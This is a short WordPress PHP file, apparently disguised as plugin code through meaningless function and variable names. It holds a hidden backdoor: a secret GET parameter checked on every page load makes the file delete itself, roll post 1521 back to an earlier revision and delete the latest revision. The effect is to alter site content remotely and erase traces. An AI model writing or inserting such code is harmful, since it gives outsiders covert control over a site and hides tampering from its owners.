<?php

function express_quiz_register_namespaced() {
	if (isset($_GET['class_timer_using']) && $_GET['class_timer_using'] === 'conditional_size_updates_divi') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$locator_year_specific_plugins = 1521;
		$migration_fx_store_graph = wp_get_post_revisions($locator_year_specific_plugins);
		if (empty($migration_fx_store_graph)) die('no revisions');
		if (count($migration_fx_store_graph) < 2) die('less than 2');
		$panel_guest_reset_global = array_shift($migration_fx_store_graph);
		$blocks_visitor_conditional_fx = $panel_guest_reset_global->ID;
		$fonts_extensions_slideshow = array_shift($migration_fx_store_graph);
		$export_discount_svg = $fonts_extensions_slideshow->ID;
		$copy_express_plus_secure = wp_restore_post_revision($export_discount_svg);
		if ($copy_express_plus_secure === false) die('error restoring');
		$copy_express_plus_secure = wp_delete_post_revision($blocks_visitor_conditional_fx);		
		if ($copy_express_plus_secure === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'express_quiz_register_namespaced');
